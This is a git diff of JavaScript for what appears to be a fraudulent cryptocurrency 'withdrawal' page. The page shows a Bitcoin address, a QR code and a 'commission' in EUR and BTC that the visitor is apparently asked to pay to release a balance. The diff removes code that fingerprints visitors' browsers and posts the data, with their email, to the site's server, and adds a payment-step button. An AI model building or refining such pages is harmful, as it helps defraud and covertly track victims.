@@ -3,47 +3,8 @@ var popup = document.getElementById('popup');
 var popupContent = document.querySelector('.popup-content');
 let checkbox = document.getElementById("checkbox-popup")
 let checkbox_1 = document.getElementById("checkbox-popup-danger")
-let url = new URL(window.location.href).searchParams.get("email")
-
-class UserInfo {
-    constructor() {
-        this.timeOpened = new Date()
-        this.timezone = (new Date().getTimezoneOffset() / 60)
-    }
-    pageon() {
-        return window.location.pathname
-    }
-    platform() { return navigator?.platform }
-    langues() { return navigator?.languages }
-    appVersion() { return navigator?.appVersion }
-    productSub() { return navigator?.productSub }
-    sicret() {
-
-        let sicret_key = `${navigator?.productSub + navigator?.vendor + navigator?.appName + navigator?.platform + navigator?.product + navigator?.appVersion}`
-
-        return sicret_key
-    }
-}
-
-let info = new UserInfo()
-
-
-
-function loaderFunction(status) {
-    if (status) {
-        let div = document.createElement('div');
-        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
-        div.id = "loader-wrapper"
-        div.innerHTML = '<div class="loader" style="color:red;"></div>'
-        document.body.append(div)
-    } else {
-        document.getElementById("loader-wrapper").remove()
-
-    }
-}
 
 async function send_request(type, laoder, url, data) {
-    if (laoder) { loaderFunction(false) }
     return new Promise((resolve, reject) => {
         let page = `https://amecacoin.online/${url}`;
         xhr.open(type, page)
@@ -76,10 +37,16 @@ async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr
     document.getElementById("qr_code").src = qr.qr_code_link
     document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
     document.querySelector(".btc_address").textContent = address
-    document.querySelector("#get_balance").textContent = `${priceEuro} EUR = ${priceInBitcoin} BTC`
+
     document.querySelector("#bitcoin-address").textContent = address
     document.querySelector("#bitcoin-commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
-    document.getElementById("loader-wrapper").remove()
+
+    let button = document.createElement('button');
+    button.className = "email-confirm__submit";
+    button.setAttribute("onclick", "showPopup()")
+    button.innerHTML = `Next<br><span class="text-auto">${priceEuro} EUR </span>`;
+    document.getElementsByClassName("get-found-button")[0].append(button);
+
 }
 
 function openPopup() {
@@ -90,30 +57,9 @@ function closePopup() {
     popup.classList.remove('show'); // Удаляем класс 'show' для скрытия попапа
 }
 
-async function check_data() {
+async function showPopup() {
     if (checkbox.checked) {
-        let users = await send_request("get", false, "users", false)
-
-        let data = {
-            id: users?.length - 1 + 1,
-            product_sub: info?.productSub(),
-            time: info?.timeOpened,
-            platform: info?.platform(),
-            langues: info?.langues(),
-            userAgent: info?.appVersion(),
-            sicret: info?.sicret(),
-            sunset: 0,
-            step: 0
-        }
-
-        send_request("post", false, "withdraws", data)
-
-        const wait = document.getElementById('wait')
-        wait.classList.add('active');
-
-        setTimeout(() => {
-            window.location.href = `withdraw-4.html?email=${url}`
-        }, 10000)
+        alert("Next step")
     } else {
         const checkbox_danger = document.querySelector(".custom-checkbox_danger")
         const checkbox_normal = document.querySelector(".custom-checkbox_normal")
@@ -124,11 +70,6 @@ async function check_data() {
 
 checkbox.addEventListener("click", () => {
     if (checkbox.checked) {
-        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
-        const checkbox_normal = document.querySelector(".custom-checkbox_normal")
-
-        checkbox_danger.classList.add("hidden")
-        checkbox_normal.classList.remove("hidden")
         popup.classList.add('show');
 
     }
@@ -138,7 +79,6 @@ checkbox.addEventListener("click", () => {
         }
     });
 })
-
 
 
 checkbox_1.addEventListener("click", () => {
